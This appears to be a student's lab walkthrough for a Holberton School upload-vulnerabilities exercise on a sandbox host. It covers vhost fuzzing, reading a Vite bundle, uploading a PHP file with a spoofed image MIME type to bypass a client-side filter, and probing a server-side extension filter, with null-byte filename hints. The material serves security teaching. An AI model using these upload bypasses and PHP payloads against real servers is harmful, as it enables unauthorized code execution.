# Upload Vulnerabilities



## 0. Oops! We forget that endpoint for testing purpose

Your mission is to determine which subdomain contains a web application with an insecure file upload feature.
This task requires you to methodically explore each subdomain, looking for any interfaces or functionalities that allow file uploads.
Identifying the correct subdomain sets the stage for deeper vulnerability analysis in subsequent tasks.

- Main Domain: http://web0x05.hbtn
- Example:
  ```
  $ cat 0-target.txt
  up3l0d3r.web0x05.hbtn
  ```

### Start sandbox

- start `cyber_websec_0x05` sandbox
- \Network information: ip: `10.42.220.203`
- put ip in `/etc/hosts` file: `
  ```bash
  sudo bash -c "echo '10.42.220.203  web0x05.hbtn' >> /etc/hosts"
  cat /etc/hosts
  ```
  - start vpn

```



### check what is running the main host

```bash
curl -sv http://web0x05.hbtn
* Host web0x05.hbtn:80 was resolved.
* IPv6: (none)
* IPv4: 10.42.220.203
*   Trying 10.42.220.203:80...
* Established connection to web0x05.hbtn (10.42.220.203 port 80) from 10.8.0.2 port 46088 
* using HTTP/1.x
> GET / HTTP/1.1
> Host: web0x05.hbtn
> User-Agent: curl/8.19.0
> Accept: */*
> 
* Request completely sent off
< HTTP/1.1 200 OK
< Server: nginx/1.22.1
< Date: Sun, 26 Jul 2026 14:32:29 GMT
< Content-Type: text/html; charset=utf-8
< Content-Length: 281
< Connection: keep-alive
< 
<html>
        <head>
                <title>Holberton School - 404 Error - Subdomain</title>
                <link rel="icon" href="/static/favicon.ico">
                <script>location.pathname != "/" ? location.replace("/", "") : null;</script>
        </head>
        <body>
                <span>Invalid Subdomain, try harder...</span>
        </body>
* Connection #0 to host web0x05.hbtn:80 left intact
</html>
```
**What we learned:**

- The IP behind the name is `10.42.220.203`, served by **nginx/1.22.1**.
- We got `HTTP/1.1 200 OK` , but 
  - the title says `404 Error - Subdomain` 
  - the body says `Invalid Subdomain, try harder...`

**nginx** here is configured with **name-based virtual hosts**: it decides what to serve based on the `Host:` header sent. When the `Host` doesn't match any real app (as with the bare `web0x05.hbtn`), it falls through to a `catch-all vhost` that returns this *"Invalid Subdomain"* page. Notice `Content-Length: 281` -- that's the fingerprint of a miss.

The subdomains aren't in DNS; they exist only as `Host:` values nginx recognizes. We'll **fuzz the `Host` header** with a wordlist and filter out anything that looks like this 281-byte "Invalid Subdomain" page. Whatever comes back *different* is a real subdomain.


### double-check baseline

Before we unleash a wordlist, let's nail down the negative baseline precisely -- i.e., confirm that a made-up subdomain also returns that same "miss" page, so we know exactly what size to filter later.

```bash
curl -s -o /dev/null -w "Status: %{http_code}  Size: %{size_download}\n" -H "Host: definitelynotreal.web0x05.hbtn" http://web0x05.hbtn
# Status: 200  Size: 281
```
- `-s` – silent, no progress meter.
- `-o /dev/null` – throw away the HTML body; we don't need to see it again.
- `-w "..."` – write-out a custom summary after the request. `%{http_code}` prints the status code and `%{size_download}` prints the response body size in bytes.
- `-H "Host: definitelynotreal.web0x05.hbtn"` – this is the important bit: we override the Host header with a subdomain we're confident doesn't exist. `curl` still connects to the same IP (resolved from `web0x05.hbtn`), but nginx sees this fake `Host`.


### fuzz vhost subdomain

```bash
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
     -u http://web0x05.hbtn/ \
     -H "Host: FUZZ.web0x05.hbtn" \
     -fs 281

#        /'___\  /'___\           /'___\       
#       /\ \__/ /\ \__/  __  __  /\ \__/       
#       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
#        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
#         \ \_\   \ \_\  \ \____/  \ \_\       
#          \/_/    \/_/   \/___/    \/_/       
#
#       v2.1.0-dev
#________________________________________________
#
# :: Method           : GET
# :: URL              : http://web0x05.hbtn/
# :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
# :: Header           : Host: FUZZ.web0x05.hbtn
# :: Follow redirects : false
# :: Calibration      : false
# :: Timeout          : 10
# :: Threads          : 40
# :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
# :: Filter           : Response size: 281
#________________________________________________
#
#:: Progress: [4989/4989] :: Job [1/1] :: 306 req/sec :: Duration: [0:00:18] :: Errors: 0 ::




# gobuster alternative

gobuster vhost -u http://web0x05.hbtn -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain
# ===============================================================
# Gobuster v3.8.2
# by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
# ===============================================================
# [+] Url:                       http://web0x05.hbtn
# [+] Method:                    GET
# [+] Threads:                   10
# [+] Wordlist:                  /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
# [+] User Agent:                gobuster/3.8.2
# [+] Timeout:                   10s
# [+] Append Domain:             true
# [+] Exclude Hostname Length:   false
# ===============================================================
# Starting gobuster in VHOST enumeration mode
# ===============================================================
# Progress: 4989 / 4989 (100.00%)
# ===============================================================
# Finished
# ===============================================================
```

- no result with `ffuf` or `gobuster`


### Examine deeper the hint `up3l0d3r.web0x05.hbtn`

Let's stop and reread the clue the challenge handed us: `up3l0d3r.web0x05.hbtn`

That's **leetspeak** – "uploader" with `o→0`, `e→3` `a→4`... actually `up3l0d3r` ≈ "upel0der". The point is the subdomains here don't follow standard naming; they're stylized/themed words. A generic DNS subdomain list will never contain them, which is exactly why we came up empty. That reframes our strategy: we either need a themed/leetspeak wordlist, or we start by testing the obvious hint the author practically gift-wrapped for us.

Before we go build or hunt for a bigger wordlist, let's spend one cheap request testing that literal example – it's the single most likely candidate and it costs nothing to check.

```bash
curl -s -o /dev/null -w "Status: %{http_code}  Size: %{size_download}\n" -H "Host: up3l0d3r.web0x05.hbtn" http://web0x05.hbtn
# Status: 200  Size: 281

curl -s -o /dev/null -w "Status: %{http_code}  Size: %{size_download}\n" -H "Host: upl04d3r.web0x05.hbtn" http://web0x05.hbtn
# Status: 200  Size: 281
```

- no new insights :-(

### bigger wordlist

```bash
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt \
     -u http://web0x05.hbtn/ \
     -H "Host: FUZZ.web0x05.hbtn" \
     -fs 281

#         /'___\  /'___\           /'___\       
#        /\ \__/ /\ \__/  __  __  /\ \__/       
#        \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
#         \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
#          \ \_\   \ \_\  \ \____/  \ \_\       
#           \/_/    \/_/   \/___/    \/_/       
# 
#        v2.1.0-dev
# ________________________________________________
# 
#  :: Method           : GET
#  :: URL              : http://web0x05.hbtn/
#  :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
#  :: Header           : Host: FUZZ.web0x05.hbtn
#  :: Follow redirects : false
#  :: Calibration      : false
#  :: Timeout          : 10
#  :: Threads          : 40
#  :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
#  :: Filter           : Response size: 281
# ________________________________________________
# 
# :: Progress: [19966/19966] :: Job [1/1] :: 248 req/sec :: Duration: [0:01:21] :: Errors: 0 ::


ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt \
     -u http://web0x05.hbtn/ \
     -H "Host: FUZZ.web0x05.hbtn" \
     -fs 281

#         /'___\  /'___\           /'___\       
#        /\ \__/ /\ \__/  __  __  /\ \__/       
#        \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
#         \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
#          \ \_\   \ \_\  \ \____/  \ \_\       
#           \/_/    \/_/   \/___/    \/_/       
# 
#        v2.1.0-dev
# ________________________________________________
# 
#  :: Method           : GET
#  :: URL              : http://web0x05.hbtn/
#  :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
#  :: Header           : Host: FUZZ.web0x05.hbtn
#  :: Follow redirects : false
#  :: Calibration      : false
#  :: Timeout          : 10
#  :: Threads          : 40
#  :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
#  :: Filter           : Response size: 281
# ________________________________________________
# 
# xn--cckcdp5nyc8g2837ahhi954c-jp [Status: 500, Size: 265, Words: 33, Lines: 6, Duration: 267ms]
# xn--7ck2d4a8083aybt3yv-com [Status: 500, Size: 265, Words: 33, Lines: 6, Duration: 273ms]
# xn--u9jxfma8gra4a5989bhzh976brkn72bo46f-com [Status: 500, Size: 265, Words: 33, Lines: 6, Duration: 112ms]
# 
# ... ~150 lines of status 500
# 
# xn--ecki1b5br0ae8iyd3due-jpnet [Status: 500, Size: 265, Words: 33, Lines: 6, Duration: 259ms]
# xn--qckyd1cv50v-jp      [Status: 500, Size: 265, Words: 33, Lines: 6, Duration: 167ms]
# xn--n8jl84alc9fsf5446c-com [Status: 500, Size: 265, Words: 33, Lines: 6, Duration: 344ms]
# :: Progress: [114442/114442] :: Job [1/1] :: 219 req/sec :: Duration: [0:08:44] :: Errors: 0 ::
```

- Everything that surfaced is an `xn--...` **punycode** entry returning `500` / **265 bytes**. These aren't real subdomains – they're internationalized-domain-name (IDN) strings in the wordlist. `nginx` (or an upstream) chokes on those unusual byte sequences in the `Host` header and throws a 500 server error (so thease are **false positives**)


### generating leet permutations

Rather than guess spellings one at a time, let's generate every plausible leet permutation programmatically and fuzz them all at once. First, let's build the wordlist.

```bash
{ for w in upload uploader uploads upl0ad upl0ad3r file files fileupload dropzone drop share sharex filedrop img image images media store storage holberton; do
    echo "$w"
    echo "$w" | sed 'y/oaeisltb/041i5l7b/'
    echo "$w" | sed 'y/aeiost/431057/'
    echo "$w" | sed 'y/aeiost/@31057/'
    echo "$w" | sed 'y/aeiost/43!057/'
    echo "$w" | sed 'y/aeiost/@3!057/'
    echo "$w" | sed 'y/aeiost/4310$7/'
    echo "$w" | sed 'y/aeiost/@310$7/'
    echo "$w" | sed 'y/aeiost/43!0$7/'
    echo "$w" | sed 'y/aeiost/@3!0$7/'
    echo "$w" | sed 'y/oae/04e/'
    echo "$w" | sed 'y/oaeis/o4315/'
  done; } | sort -u > leet-upload.txt; wc -l leet-upload.txt; cat leet-upload.txt

# 111 leet-upload.txt

ffuf -w leet-upload.txt \
     -u http://web0x05.hbtn/ \
     -H "Host: FUZZ.web0x05.hbtn" \
     -fs 281
#         /'___\  /'___\           /'___\       
#        /\ \__/ /\ \__/  __  __  /\ \__/       
#        \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
#         \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
#          \ \_\   \ \_\  \ \____/  \ \_\       
#           \/_/    \/_/   \/___/    \/_/       
# 
#        v2.1.0-dev
# ________________________________________________
# 
#  :: Method           : GET
#  :: URL              : http://web0x05.hbtn/
#  :: Wordlist         : FUZZ: /home/kali/dlh-cyber_security/web_application_security/0x05_upload_vulnerabilities/leet-upload.txt
#  :: Header           : Host: FUZZ.web0x05.hbtn
#  :: Follow redirects : false
#  :: Calibration      : false
#  :: Timeout          : 10
#  :: Threads          : 40
#  :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
#  :: Filter           : Response size: 281
# ________________________________________________
# 
# :: Progress: [111/111] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0 ::
```
- built a custom "leet" wordlist in `leet-upload.txt` of 111 words
- unfortunately still no hits :-(


### Fuzzing URL Path instead of Host header

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt \
     -u http://web0x05.hbtn/FUZZ \
     -fs 281 -mc all -fc 404

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://web0x05.hbtn/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: all
 :: Filter           : Response status: 404
 :: Filter           : Response size: 281
________________________________________________

:: Progress: [63088/63088] :: Job [1/1] :: 284 req/sec :: Duration: [0:04:30] :: Errors: 0 ::
```

- Instead of fuzzing the **Host header** (vhosts), this fuzzes the **URL path** on the main domain. The idea: the "Invalid Subdomain" page might be a catch-all for *unknown hosts*, but the main host itself may still serve real paths (like `/upload`, `/robots.txt`, `/static/`) that reveal how the app is structured or reference the real subdomain names.
- `-u http://web0x05.hbtn/FUZZ` – FUZZ is now in the path, not the Host.
- `-w raft-medium-words.txt` – a standard content-discovery wordlist (common directory/file names).
- `-fs 281` – still filter the 281-byte miss page.
- `-mc all` – match all status codes (so we see 200/301/403/500, not just the defaults), then...
- `-fc 404` – ...filter out genuine 404s to cut noise.

We were checking whether the main domain exposes any **real paths** – an upload endpoint, a `robots.txt`, a sitemap, static assets, or an index that names other subdomains. Any of these could hand us the real subdomain directly instead of guessing -- but nope, no clues here either :-(



# check for purpose-built wordlists

```bash
ls -la /usr/share/seclists/Discovery/DNS/ | grep -iE 'leet|hacker|hostname|namelist|deepmagic|combined'
-rw-r--r-- 1 root root  8285473 Sep 19  2025 combined_subdomains.txt
-rw-r--r-- 1 root root   605423 Sep 19  2025 deepmagic.com-prefixes-top50000.txt
-rw-r--r-- 1 root root     3384 Sep 19  2025 deepmagic.com-prefixes-top500.txt
-rw-r--r-- 1 root root  1585853 Sep 19  2025 namelist.txt
-rw-r--r-- 1 root root   924904 Sep 19  2025 sortedcombined-knock-dnsrecon-fierce-reconng.txt
```

- These lists are ok, but too small.
- let's go for something big.


# check bigger wordlists

```bash
ls -lhS /usr/share/seclists/Discovery/DNS/ | head 
## -rw-r--r-- 1 root root  74M Sep 19  2025 FUZZSUBS_CYFARE_1.txt
## -rw-r--r-- 1 root root  74M Sep 19  2025 FUZZSUBS_CYFARE_2.txt
## -rw-r--r-- 1 root root  50M Sep 19  2025 n0kovo_subdomains.txt
## -rw-r--r-- 1 root root  26M Sep 19  2025 dns-Jhaddix.txt
## -rw-r--r-- 1 root root  25M Sep 19  2025 bug-bounty-program-subdomains-trickest-inventory.txt
## -rw-r--r-- 1 root root 8.0M Sep 19  2025 combined_subdomains.txt
## -rw-r--r-- 1 root root 5.8M Sep 19  2025 shubs-subdomains.txt
## -rw-r--r-- 1 root root 1.6M Sep 19  2025 namelist.txt
## -rw-r--r-- 1 root root 1.4M Sep 19  2025 bitquark-subdomains-top100000.txt
```

## fuzzing with `dns-Jhaddix.txt` (26 MB)

```bash
ffuf -w /usr/share/seclists/Discovery/DNS/dns-Jhaddix.txt \        
     -u http://web0x05.hbtn/ \
     -H "Host: FUZZ.web0x05.hbtn" \
     -fs 281 -t 80 -o dns-Jhaddix.json
# test-s3
```


### check result 

```bash

curl -s http://web0x05.hbtn -H "Host: test-s3.web0x05.hbtn"            
# <!-- 
#         Done by 
#         -       Yosri.me (YosriGFX)
#         -       Ismail Mejdoub (Mejdoubee)
#         For Holberton School
# -->
# <!doctype html>
# <html lang="en">
#   <head>
#     <meta charset="UTF-8" />
#         <link rel="icon" href="/static/favicon.ico">
#     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
#     <title>File Manager - </title>
#     <script type="module" crossorigin src="/static/index-DYK-Cu5G.js"></script>
#   </head>
#   <body>
#     <div id="main" data-url=""></div>
#   </body>
# </html>
```

### save result

```bash
echo test-s3.web0x05.hbtn > 0-target.txt
cat 0-target.txt

git add .
git commit -m "0-target.txt"
git push
```



## 1. Some filters are only client-sided !

Having identified the vulnerable subdomain, your next challenge is to bypass the client-side file type filtering mechanism of the web application's upload feature.
Your success in uploading a restricted file type will reveal a hidden Flag ⛳️ as proof of your accomplishment.

- Target Endpoint: http://[vuln-subdomain].web0x05.hbtn/task1

You will need to use this php command to read the flag: <?php readfile('FLAG_1.txt') ?>
FLAG will only be generated if you upload a php file!

**Useful Instructions**

1. Use browser developer tools to inspect the upload form and any JavaScript code that validates file types. Look for patterns or keywords it checks against.
2. Consider using tools like Burp Suite to intercept and modify the upload request, changing the file name or MIME type to bypass client-side checks.
3. Explore different ways to initiate the file upload (e.g., drag-and-drop functionality) that might not trigger client-side validation as expected.
4. Pay attention to any error messages or feedback from the server after attempting an upload. These messages can offer clues for refining your bypass technique.


### examine `/task1` page

```bash
curl -v http://test-s3.web0x05.hbtn/task1                 
# * Could not resolve host: test-s3.web0x05.hbtn
# * Store negative name resolve for test-s3.web0x05.hbtn:80
# * shutting down connection #0
# curl: (6) Could not resolve host: test-s3.web0x05.hbtn
```

`test-s3.web0x05.hbtn` doesn't resolve because it's a virtual host, not a real DNS name.  \
Only `web0x05.hbtn` is in our `/etc/hosts`  \
Earlier we never resolved the subdomain – we always sent it as a `Host:` header while connecting to the base name. So we have two clean options:

1. **Option A** keep the `Host:` header and connect to the base host

```bash
curl -s -H "Host: test-s3.web0x05.hbtn" http://web0x05.hbtn/task1 | tee task1.html
# <!-- 
#       Done by 
#       -       Yosri.me (YosriGFX)
#       -       Ismail Mejdoub (Mejdoubee)
#       For Holberton School
# -->
# <!doctype html>
# <html lang="en">
#   <head>
#     <meta charset="UTF-8" />
#         <link rel="icon" href="/static/favicon.ico">
#     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
#     <title>File Manager - task1</title>
#     <script type="module" crossorigin src="/static/index-DYK-Cu5G.js"></script>
#   </head>
#   <body>
#     <div id="main" data-url="/api/task1/"></div>
#   </body>
# </html>
``` 

2. **Option B – add the vhost to `/etc/hosts` (most convenient)**. This makes the subdomain resolve to the same IP, so every normal command (`curl http://test-s3.web0x05.hbtn/...`, and even a browser) just works without header gymnastics.

```bash
# add vhost
echo "10.42.220.203 test-s3.web0x05.hbtn" | sudo tee -a /etc/hosts
# check /etc/hosts
cat /etc/hosts

# re-run the fetch
curl -s http://test-s3.web0x05.hbtn/task1 | tee task1.html; echo; wc -c task1.html
# <!-- 
#         Done by 
#         -       Yosri.me (YosriGFX)
#         -       Ismail Mejdoub (Mejdoubee)
#         For Holberton School
# -->
# <!doctype html>
# <html lang="en">
#   <head>
#     <meta charset="UTF-8" />
#         <link rel="icon" href="/static/favicon.ico">
#     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
#     <title>File Manager - task1</title>
#     <script type="module" crossorigin src="/static/index-DYK-Cu5G.js"></script>
#   </head>
#   <body>
#     <div id="main" data-url="/api/task1/"></div>
#   </body>
# </html>
# 494 task1.html
```

Better to go with option B because Burp/browser inspection is simpler.

The vhost resolves now, and this page hands us the key detail: **it's a JavaScript single-page app**.  \
The HTML is just a shell – the real logic lives in the JS bundle, and crucially, the mount point tells us the API base:

```html
<div id="main" data-url="/api/task1/"></div>
```

So the front-end (the `index-DYK-Cu5G.js` bundle) does its file-type validation in the browser, then POSTs to an API under `/api/task1/`. That `data-url` is the thread to pull: the client-side filter is exactly what we're meant to bypass, and the way to bypass a client-side check is to skip the client entirely and hit the API directly with curl. But first we need to know the exact request shape the API expects – the precise endpoint path, the file field name, and any other form fields.

Let's read the JS bundle first – it will show us the field names and the exact upload URL without guesswork.

```bash
curl -s http://test-s3.web0x05.hbtn/static/index-DYK-Cu5G.js | tee bundle.js | wc -c
# 451923
```

Let's check if minified.

```bash
head -c 500 bundle.js; echo; echo "--- line count ---"; wc -l bundle.js
# function __vite__mapDeps(indexes) {
#  if (!__vite__mapDeps.viteFileDeps) {
#     __vite__mapDeps.viteFileDeps = ["static/routes/file-manager-B-dpKQ9v.js","static/routes/snackbar-provider-BKjL41nT.js","static/routes/ButtonBase-BYeNwEdz.js","static/routes/useEnhancedEffect-CRBrkxaE.js","static/routes/403-B2xe_i3I.js","static/routes/motion-container-DHsPk0bY.js","static/routes/bounce-i2n4nULb.js","static/routes/Button-CG_aPiPw.js","static/routes/404-DPw30Jnz.js","static/routes/index-B12osy1N.js","sta
# --- line count ---
# 71 bundle.js
```

~ 6kB / line => minified.

- **71 lines for 441 KB** = ~6 KB per line on average. Human-written code is more like 30–80 chars per line. That density is the signature of minification: everything crammed onto few lines.
- The first bytes show `__vite__mapDeps` – so this is a **Vite** production build, exactly the tool we suspected from the hashed filename.
Notice the string array it's printing: `static/routes/file-manager-...js`, `403-...js`, `404-...js`, `Button-...js`. Vite does **code-splitting** – it lazy-loads route chunks. So the *upload logic for task1 probably isn't in this main bundle at all*; it's in one of these separate route chunks that loads on demand. The main bundle is mostly the router and framework glue.

This changes our search slightly: rather than grep the main bundle for upload logic that may live elsewhere, let's first pull out the **full list of route chunks** so we can spot the one that handles uploads (likely something with "upload", "task", or "file-manager" in the name).

```bash
grep -oE '"static/routes/[^"]+\.js"' bundle.js | tr -d '"' | sort -u
# static/routes/403-B2xe_i3I.js
# static/routes/404-DPw30Jnz.js
# static/routes/bounce-i2n4nULb.js
# static/routes/ButtonBase-BYeNwEdz.js
# static/routes/Button-CG_aPiPw.js
# static/routes/classic-J3PRySif.js
# static/routes/Container-Dmjin0dr.js
# static/routes/file-manager-B-dpKQ9v.js
# static/routes/header-simple-Cqv09_xg.js
# static/routes/index-B12osy1N.js
# static/routes/index-BPBoasAD.js
# static/routes/modern-compact-BAiPVhy_.js
# static/routes/motion-container-DHsPk0bY.js
# static/routes/snackbar-provider-BKjL41nT.js
# static/routes/Stack-aV8DaWSP.js
# static/routes/Toolbar-DizB3ty0.js
# static/routes/useEnhancedEffect-CRBrkxaE.js
# static/routes/use-responsive-BjpGEwk-.js
```

The standout candidate is **`file-manager-B-dpKQ9v.js`** – that's the app's core feature ("File Manager" was the page title all along), and the upload form plus its client-side filter almost certainly live there. The others are framework/UI plumbing (`Button`, `Stack`, `Toolbar`, `Container`), page shells (`403`, `404`), or theme variants (`classic`, `modern-compact`).

Let's pull that chunk and immediately search for the interesting strings.

```bash
curl -s http://test-s3.web0x05.hbtn/static/routes/file-manager-B-dpKQ9v.js -o file-manager.js
grep -oiE '\.(php|jpg|jpeg|png|gif|pdf|txt|svg|zip|exe)\b' file-manager.js | sort | uniq -c
echo "--- api / upload strings ---"
grep -oiE '(/api/[a-z0-9/_-]*|upload|accept|multipart|formdata|allowed|mime|extension)' file-manager.js | sort | uniq -c
# --- api / upload strings ---
#       1 /api/list/
#       1 FormData
#       5 upload
#       1 Upload
```

- download JS chunck locally as `file-manager.js`
- First grep – `\.(php|jpg|...)\b` scans for **file-extension literals**. The client-side filter has to name the extensions it allows or blocks somewhere, and minification leaves string literals untouched. `uniq -c` counts each so we see which extensions the code mentions. If we see `jpg/png/gif` but the task wants us to upload `.php`, that's the exact filter we're bypassing.
- Second grep – hunts for the A**PI and upload mechanics**: any `/api/...` path (our POST target, building on the `/api/task1/` we saw in `data-url`), plus telltale words like `upload`, `accept`, `multipart`, `formdata`, `allowed`, `mime`, `extension`. These reveal the endpoint, the request encoding, and the field names.

**Result**:

1. **No extension literals in this chunk**. That's actually a meaningful clue. It suggests the allowed-types filter might not be a hardcoded list like `['jpg','png']` in the code – it could instead be driven by an `accept` attribute on the file input, or a MIME check, or configuration fetched from the API. Or the upload logic lives partly in a *different* chunk. Either way, our simple grep was too narrow.
2. **`/api/list/` and `FormData` confirm the shape**. The app uses `FormData` (multipart) and has at least a listing endpoint. The upload endpoint itself didn't print as a clean `/api/...` string – which often means it's **built dynamically** by concatenating the base URL (remember `data-url="/api/task1/"`) with a suffix, so it doesn't exist as one literal string for grep to find.

Let's look at the actual **context around the `upload` occurrences** – that's where the endpoint, the field name, and any filtering will be visible together.

```bash
grep -oiE '.{80}upload.{90}' file-manager.js                                               
# hen((e=>e.$))),__vite__mapDeps([0,1,2,3,4,5,6,7,8])))),l={list_dir:"/api/list/",upload:document.getElementById("main").getAttribute("data-url")};function o(){const{enqueueSnack
# {children:t.jsx("title",{children:" Dashboard: File Manager"})}),t.jsx(n,{handleUpload:(e,t,a)=>{if(l.upload){const r=new FormData;r.append("file",e),fetch(l.upload,{method:"PO
# e.json())).then((e=>{e.error?t(e.error):(s(e.message),d(),a())}))}else t("Can't upload. Currently we don't support uploads.")},allFiles:o,setAllFiles:i,allTypes:["image"]})]})}
```

- `.{80}upload.{80}` – matches the word `upload` **plus 80/90 characters on each side**.  \
That surrounding context typically contains the endpoint path being built, the `FormData.append("fieldname", file)` call (revealing the *file field name*), and any adjacent validation.
- **Endpoint**: `upload:document.getElementById("main").getAttribute("data-url")` – so the upload URL is the `data-url` we already saw: **`/api/task1/`**. The POST goes straight there.
- **Field name**: `r.append("file",e)` – the file is sent under the field name **`file`**. curl must match this exactly.
- **Request**: `r=new FormData` `+` `fetch(l.upload, {...})` → a standard multipart/form-data **POST**
- **The filter**: the very end shows `allTypes:["image"]`, i.e. a client-side allowed-types list restricted to images. That's the check we bypass.  \
Note: this validation exists only in the browser JS. The server-side handler at `/api/task1/` is what we're POSTing to directly – skipping the JS means skipping the filter entirely.

- alternatively we can prettify the minified code:

```bash
npx prettier file-manager.js --parser babel > file-manager-pretty.js
```


```js
        t.jsx(n, {
          handleUpload: (e, t, a) => {
            if (l.upload) {
              const r = new FormData();
              (r.append("file", e),
                fetch(l.upload, { method: "POST", body: r })
                  .then((e) => e.json())
                  .then((e) => {
                    e.error ? t(e.error) : (s(e.message), d(), a());
                  }));
            } else t("Can't upload. Currently we don't support uploads.");
          },
          allFiles: o,
          setAllFiles: i,
          allTypes: ["image"],
        }),
```


We have everything needed. Let's build the PHP payload and upload it in one go.


```bash
# create php file
printf "%s" "<?php readfile('FLAG_1.txt') ?>" > shell.php

# check php file
cat shell.php
# <?php readfile('FLAG_1.txt') ?>

# upload
curl -s -i -X POST http://test-s3.web0x05.hbtn/api/task1/ -F "file=@shell.php;type=image/png"
# HTTP/1.1 200 OK
# Server: nginx/1.22.1
# Date: Sun, 26 Jul 2026 21:22:58 GMT
# Content-Type: application/json
# Content-Length: 64
# Connection: keep-alive
# 
# {"message":"'/static/upload/shell.php' uploaded successfully."}
```

- `shell.php` payload uploaded at **`/static/upload/shell.php`**


### activate php payload

```bash
curl -s http://test-s3.web0x05.hbtn/static/upload/shell.php
# 91bfa5e55b2c6d354bc91479e62207bf
```

### save flag

```bash
echo 91bfa5e55b2c6d354bc91479e62207bf > 1-flag.txt
cat 1-flag.txt

git add .
git commit -m "1-flag.txt"
git push
```



## 2. Special Characters are so special !

After successfully navigating past the client-side restrictions, you're faced with a more formidable challenge: bypassing the server-side validation that scrutinizes the file formats being uploaded.

This task requires you to cleverly use special characters in the file name to deceive the server-side checks, allowing you to upload a file type that is normally restricted.
Successfully uploading such a file will unveil a hidden `Flag` ⛳️.


Target Endpoint: http://[vuln-subdomain].web0x05.hbtn/task2

You will need to use this php command to read the flag: `<?php readfile('FLAG_2.txt') ?>`, FLAG will only be generated if you upload a php file!

**Useful Instructions**

1. Investigate how the server processes file names and extensions. Some servers might strip or ignore certain special characters, altering the file name after processing.
2. Experiment with adding special characters like spaces, dots, or null bytes (`%00`) in the file extension. For example, attempting to upload a file named `payload.php.jpg` might be blocked, but `payload.php%00.jpg` could bypass the filter if the server improperly handles null bytes.
3. Utilize tools like Burp Suite to intercept and modify your upload requests, carefully crafting the file names with special characters to test the server's validation logic.
4. Keep an eye on the server's response to each upload attempt. A successful bypass might not always be explicitly confirmed by the application’s UI. Check for any changes in behavior or new functionalities accessible after your upload.


Meanwhile sandbox time out, new sandbox, replace ip in /etc/hosts
```bash
swapip 10.42.220.203 10.42.143.173 
# initiate and check vpn
ovi
ovc
```

---

This one steps up: now the server checks the filename too, and the task title plus the hints tell us the weakness is in **how the server parses special characters** in the name. Same core setup as Task 1 (POST multipart to the API, field name `file`), but a raw `shell.php` will now be rejected. Our job is to find the parsing quirk.

Before we start throwing special characters, let's do this methodically: first establish **what the server rejects**, so we have a baseline error to compare against. We need to see the exact rejection message for a plain `.php` – that message often hints at how it's filtering (extension blocklist? checking the last extension? substring match?).

Let's also confirm the endpoint is the parallel `/api/task2/`. First, a quick check of the task2 page to grab its `data-url`, mirroring what we did before.

```bash
curl -s http://test-s3.web0x05.hbtn/task2 | grep -oE 'data-url="[^"]*"'
# data-url="/api/task2/"
```

Confirmed – the endpoint is `/api/task2/`, exactly parallel to task1. Now let's provoke the server-side filter so we can see how it rejects things. Understanding the rejection is what tells us which special-character trick will work; blindly trying `%00`, spaces, and dots without reading the errors is just guessing.

Let's send a plain `shell2.php` (adapted for FLAG2) and read the response.

```bash
# create shell2.php for FLAG2
printf "%s" "<?php readfile('FLAG_2.txt') ?>" > shell2.php

# trust but verify
cat shell2.php
# <?php readfile('FLAG_2.txt') ?>

# try upload
curl -v -X POST http://test-s3.web0x05.hbtn/api/task2/ -F "file=@shell2.php;type=image/png"

# * Host test-s3.web0x05.hbtn:80 was resolved.
# * IPv6: (none)
# * IPv4: 10.42.143.173
# *   Trying 10.42.143.173:80...
# * Established connection to test-s3.web0x05.hbtn (10.42.143.173 port 80) from 10.8.0.2 port 51202 
# * using HTTP/1.x
# > POST /api/task2/ HTTP/1.1
# > Host: test-s3.web0x05.hbtn
# > User-Agent: curl/8.19.0
# > Accept: */*
# > Content-Length: 230
# > Content-Type: multipart/form-data; # boundary=------------------------AViEVXiYVT188xEEKPVhFB
# > 
# * upload completely sent off: 230 bytes
# < HTTP/1.1 400 BAD REQUEST
# < Server: nginx/1.22.1
# < Date: Mon, 27 Jul 2026 10:31:23 GMT
# < Content-Type: application/json
# < Content-Length: 35
# < Connection: keep-alive
# < 
# {"error":"File type not allowed."}
# * Connection #0 to host test-s3.web0x05.hbtn:80 left intact
```

There's our baseline: a plain `.php` gets **400 "File type not allowed."** So the server-side filter is active and rejecting based on file type/extension. Now we need to learn how it decides – because the right bypass depends entirely on the parsing flaw.

